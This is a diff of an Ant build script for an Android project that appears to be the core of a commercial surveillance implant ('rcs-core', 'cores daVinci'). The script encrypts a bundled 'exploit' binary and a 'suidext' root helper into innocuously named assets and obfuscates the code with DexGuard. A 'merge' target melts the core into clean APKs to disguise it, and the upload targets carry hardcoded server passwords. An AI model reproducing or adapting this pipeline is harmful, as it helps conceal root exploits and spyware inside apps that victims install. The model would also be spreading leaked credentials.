@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<project name="android_service" default="help">
+<project name="android_networking" default="help">
 
 	<taskdef resource="net/sf/antcontrib/antlib.xml">
 		<classpath>
@@ -15,25 +15,36 @@
 
 	<taskdef name="crypter" classname="com.example.ant.Crypter">
 		<classpath>
-			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
+			<pathelement path="../crypter/build/archive/crypter-ant.jar" />
 		</classpath>
 	</taskdef>
 
 	<taskdef name="random" classname="com.example.ant.RandomString">
 		<classpath>
-			<pathelement path="${basedir}/../crypter/build/archive/crypter-ant.jar" />
-			<fileset dir="${basedir}/../crypter/lib">
+			<pathelement path="../crypter/build/archive/crypter-ant.jar" />
+			<fileset dir="../crypter/lib">
 				<include name="**/*.jar" />
 				<include name="**/*.zip" />
 			</fileset>
 		</classpath>
 	</taskdef>
 
+    <copy file="preprocess/local_properties.txt" tofile="local.properties" overwrite="false"/>
 	<loadproperties srcFile="local.properties" />
 	<property file="ant.properties" />
 	<loadproperties srcFile="project.properties" />
-	<property name="ruby.path" value="C:/Ruby193/bin" />
-	<property name="rcscore.path" value="C:/HT/rcs-core-build" />
+
+	<property name="rcscore.path" value="antlibs"/>
+	<property name="out.dir" value="bin" />
+	<property name="out.classes.absolute.dir" location="${out.dir}/classes" />
+
+	<import file="custom_rules.xml" optional="true" />
+	<target name="release" depends="-set-release-mode, -release-prompt-for-password, -package, -post-package, -post-build" />
+	<target name="debug" depends="-set-debug-mode, -set-debug-files, -package, -post-package, -post-build" />
+	<target name="instrument" depends="-set-instrumented-mode, debug" />
+	<!--
+ -->
+
 	<import file="${sdk.dir}/tools/ant/build.xml" />
 
 	<property file="version.properties" />
@@ -56,23 +67,24 @@
 	</filterset>
 
 	<target name="salt" unless="randomSalt">
-		<random len="8" property="randomSalt">
-		</random>
+		<random len="8" property="randomSalt" />
 		<echo>RandomSalt:${randomSalt}</echo>
-	</target>
 
-	<target name="key">
-		<random len="8" property="randomKey">
-		</random>
-		<echo>RandomKey:${randomKey}</echo>
+		<random len="8" property="randomKeyMessages" />
+		<random len="8" property="randomKeyStatusDb" />
+		<random len="8" property="randomKeyStatusLog" />
 	</target>
 
 	<target name="encrypt-messages" depends="salt">
+        <mkdir dir="assets" />
+    
 		<delete file="res/raw/messages.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D00448D7A912B" inputFile="preprocess/messages.properties.all" outputFile="res/raw/messages.bin" />
+		<delete file="assets/m.bin" />
+        
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyMessages}" inputFile="preprocess/messages.properties.all" outputFile="assets/m.bin" />
 		<delete file="res/raw/statusdb.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912A" inputFile="libs/armeabi/suidext" outputFile="res/raw/statusdb.bin" />
-
+		<delete file="assets/s.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}" inputFile="preprocess/suidext" outputFile="assets/s.bin" />
 	</target>
 
 	<target name="encrypt-manifest" depends="salt">
@@ -84,17 +96,18 @@
 
 	<target name="encrypt-exploit" depends="salt">
 		<delete file="res/raw/statuslog.bin" />
-		<crypter encrypt="true" salt="${randomSalt}" keyFile="0x5A3D10448D7A912B" inputFile="libs/armeabi/exploit" outputFile="res/raw/statuslog.bin" />
+		<delete file="assets/e.bin" />
+		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusLog}" inputFile="preprocess/exploit" outputFile="assets/e.bin" />
 	</target>
 
 	<target name="encrypt-noexploit">
-		<delete file="res/raw/statuslog.bin" />
-		<touch file="res/raw/statuslog.bin" />
+		<delete file="assets/e.bin" />
+		<touch file="assets/e.bin" />
 	</target>
 
 	<target name="encrypt-nomanifest">
 		<delete file="res/raw/layout.bin" />
-		<touch file="res/raw/layout.bin" />
+		<!-- <touch file="res/raw/layout.bin" /> -->
 	</target>
 
 	<target name="libsnoexp" depends="encrypt-messages, encrypt-noexploit, encrypt-nomanifest">
@@ -114,7 +127,7 @@
 	</target>
 
 	<!-- = = = = = = = = = = = = = = = = =
-          macrodef: set-cfg
+          macrodef: set-cfg0
           copies Cfg.java considering:
           - kind: debug, release
           - version: 2,3     
@@ -133,21 +146,40 @@
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
-					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
+					<var name="iscamera" value="false" />
+					<copy file="preprocess/config.debug.bin" toFile="assets/c.bin" overwrite="true" />
+					<copy file="preprocess/resources.patched.bin" toFile="assets/r.bin" overwrite="true" />
+					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
 				</case>
 				<case value="release">
 					<echo message="set release" />
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
-					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
+					<var name="iscamera" value="false" />
+					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
+					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
+					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
+				</case>
+				<case value="merge">
+					<echo message="set merge" />
+					<antcall target="libsnoexp" />
+					<var name="isdebug" value="false" />
+					<var name="isexploit" value="false" />
+					<var name="iscamera" value="false" />
+					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
+					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
+					<copy file="preprocess/dexguard-project.merge.txt" toFile="dexguard-project.txt" overwrite="true" />
 				</case>
 				<case value="exploit">
 					<echo message="set exploit" />
 					<antcall target="libsexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="true" />
-					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
+					<var name="iscamera" value="false" />
+					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
+					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
+					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
 				</case>
 			</switch>
 
@@ -168,7 +200,7 @@
 					<copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="true">
 						<filterset>
 							<filter token="CAVEAT" value="QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS" />
-							<filter token="DEBUGGABLE" value="${isdebug}" />
+							<filter token="DEBUGGABLE" value="true" />
 						</filterset>
 					</copy>
 				</else>
@@ -178,21 +210,26 @@
 			<delete file="assets/statusdb" />
 
 			<echo message="copy resources and Cfg" />
-			<copy file="preprocess/resources.bin" toFile="res/raw/resources.bin" overwrite="true" />
-			<copy file="preprocess/Cfg.java" toFile="src/com/android/service/auto/Cfg.java" overwrite="true">
+
+			<copy file="preprocess/Cfg.java" toFile="src/com/android/networking/auto/Cfg.java" overwrite="true">
 				<filterset>
 					<filter token="BUILD_ID" value="${build.number}" />
 					<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
 					<filter token="DEBUG" value="${isdebug}" />
-					<!-- TODO RIMETTERE!!!! filter token="EXCEPTION" value="${isdebug}" / -->
 					<filter token="EXCEPTION" value="${isdebug}" />
 					<filter token="EXPLOIT" value="${isexploit}" />
+					<filter token="CAMERA" value="${iscamera}" />
 					<filter token="DEMO" value="false" />
-					<filter token="KEYS" value="${isdebug}" />
+					<!-- TODO RIMETTERE!!!! filter token="KEYS" value="${isdebug}" / -->
+					<filter token="KEYS" value="false" />
 					<filter token="FILE" value="true" />
 					<filter token="RANDOM" value="${randomSalt}" />
 					<filter token="OSVERSION" value="@{osversion}" />
 					<filter token="VERSION" value="${version}" />
+					<filter token="RNDLOG" value="${randomKeyStatusLog}" />
+					<filter token="RNDDB" value="${randomKeyStatusDb}" />
+					<filter token="RNDMSG" value="${randomKeyMessages}" />
+
 				</filterset>
 			</copy>
 
@@ -205,9 +242,9 @@
 		<attribute name="password" />
 		<attribute name="file" />
 		<sequential>
-			<echo>@{server}</echo>
+			<echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>
 
-			<exec executable="${ruby.path}/ruby.exe" dir="." failonerror="true">
+			<exec executable="${ruby.path}" dir="." failonerror="true">
 				<arg value="${rcscore.path}/rcs-core.rb" />
 				<arg value="-u" />
 				<arg value="@{login}" />
@@ -243,8 +280,8 @@
 	<target name="reverse">
 		<echo message="Reverse" />
 		<deltree dir="reverse" />
-		<copy file="bin/android_service-release.apk" toDir="reverse" />
-		<unzip src="reverse/android_service-release.apk" dest="reverse" />
+		<copy file="bin/android_networking-release.apk" toDir="reverse" />
+		<unzip src="reverse/android_networking-release.apk" dest="reverse" />
 
 		<exec executable="..\..\HT\Reversing\dex2jar\dex2jar.bat">
 			<arg value="reverse/classes.dex" />
@@ -267,21 +304,12 @@
 		</checksum>
 	</target>
 
-	<target name="update">
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\android_${version}.zip" />
-		<copy file=".\server\android_${version}.zip" toFile="\\rcs-dev\share\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" />
-	</target>
-
-	<target name="updatezenotto">
-		<updaterelease server="zenotto" login="admin" password="adminp123" file=".\server\android_${version}.zip" />
-		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
-	</target>
 
 	<target name="help">
 		<echo>ant build :  full build</echo>
 		<echo>ant dist : create a dist zip in ../dist</echo>
-		<echo>ant set-debug : make messages.bin and cfg.java, for debug</echo>
-		<echo>ant set-release : make messages.bin and cfg.java, for release</echo>
+		<echo>ant set-debug-default : make messages.bin and cfg.java, for debug</echo>
+		<echo>ant set-release-v2 : make messages.bin and cfg.java, for release</echo>
 		<echo>ant update : uploads the core to castore</echo>
 	</target>
 
@@ -295,6 +323,16 @@
 		</set-cfg>
 	</target>
 
+	<target name="set-release-default" depends="init">
+		<set-cfg kind="release" osversion="default">
+		</set-cfg>
+	</target>
+
+	<target name="set-merge-v2" depends="init">
+		<set-cfg kind="merge" osversion="v2">
+		</set-cfg>
+	</target>
+
 	<target name="set-debug-default" depends="init">
 		<set-cfg kind="debug" osversion="default">
 		</set-cfg>
@@ -303,15 +341,16 @@
 	<target name="build" depends="init">
 		<buildnumber />
 		<delete dir="output" />
-		<for list="v2,default" param="osversion">
+		<for list="default,v2" param="osversion">
 			<sequential>
 				<echo message="==============" />
-				<echo message="===  BUILD === ------------------------------------------------------------" />
+				<echo message="===  BUILD ===" />
 				<echo message="==============" />
 				<echo>Version @{osversion}</echo>
 
-				<for list="debug,release" param="kind">
+				<for list="release,debug" param="kind">
 					<sequential>
+                        <echo>clean</echo>
 						<antcall target="clean" />
 
 						<echo message="bin/@{osversion}/@{kind}/core.android" />
@@ -323,14 +362,16 @@
 								<echo message="==============" />
 								<echo>call debug</echo>
 								<antcall target="debug" inheritAll="false" />
-								<var name="filename" value="bin/android_service-debug.apk" />
+                                <!-- <var name="filename" value="bin/android_networking-debug-unaligned.apk" /> -->
+								<var name="filename" value="bin/android_networking-debug.apk" />
 
 							</then>
 							<else>
 								<echo message="==============" />
 								<echo>call release</echo>
 								<antcall target="release" inheritAll="false" />
-								<var name="filename" value="bin/android_service-release-unsigned.apk" />
+                                <!-- <var name="filename" value="bin/android_networking-release-unsigned.apk" /> -->
+								<var name="filename" value="bin/android_networking-release.apk" />
 							</else>
 						</iff>
 
@@ -339,11 +380,26 @@
 					</sequential>
 				</for>
 			</sequential>
+
 		</for>
+
+		<antcall target="merge" />
 	</target>
 
-
-
+	<target name="merge" depends="init">
+		<antcall target="clean" />
+		<set-cfg osversion="v2" kind="merge" />
+		<echo message="==============" />
+		<echo>BUILD merge</echo>
+		<antcall target="release" inheritAll="false" />
+        <!-- <var name="filename" value="bin/android_networking-release-unsigned.apk" /> -->
+		<var name="filename" value="bin/android_networking-release.apk" />
+		<mkdir dir="output/merge/" />
+		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />		
+		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
+		<echo>../../merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
+	</target>
+	
 	<target name="servercore">
 		<delete dir="server/core" />
 		<mkdir dir="server/core" />
@@ -358,17 +414,20 @@
 				<filter token="VERSION" value="${version}" />
 			</filterset>
 		</copy>
-
+				
 		<copy toDir="server/core" overwrite="true">
 			<fileset dir="output/release/" />
 		</copy>
+		
+		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
 
 		<zip destfile="server/android_${version}.zip" basedir="server/core" />
 	</target>
 
 	<target name="dist" depends="init">
+		<echo>version = ${version}</echo>
+		<echo>release = ${do.release}</echo>
 
-		<input message="Release (8.1)?" addproperty="do.release" defaultvalue="8.1" />
 		<var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
 		<echo>${destdir}</echo>
 		<mkdir dir="${destdir}" />
@@ -388,5 +447,36 @@
 		-->
 
 	</target>
+    
+	<target name="update">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
+		<copy file="./server/android_${version}.zip" toFile="//rcs-dev/share/RELEASE/SVILUPPO/cores daVinci/android.zip" overwrite="true" />
+	</target>
+
+	<target name="updatecastore">
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="server/android_${version}.zip" />
+	</target>
+	
+	<target name="updatepolluce">
+		<updaterelease server="rcs-polluce" login="zeno" password="zenop123" file="server/android_${version}.zip" />
+	</target>
+
+	<target name="updatezeus">
+		<updaterelease server="zeus" login="admin" password="adminp123" file="/server/android_${version}.zip" />
+		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
+	</target>
+    
+    <target name="ci">        
+        <echo>target ci</echo>
+        <copy file="preprocess/AndroidManifest.ACTIVITY.xml" tofile="AndroidManifest.xml" overwrite="false"/>
+        <antcall target="build" />
+        <var name="destdir" value="../dist/${do.release}/${build.number}.${timestamp.BUILD}" />
+		<echo>${destdir}</echo>
+		<mkdir dir="${destdir}" />
+
+		<antcall target="servercore" />
+		<copy file="server/android_${version}.zip" toDir="${destdir}" overwrite="true" />
+		<antcall target="updatecastore" />
+    </target>
 
 </project>
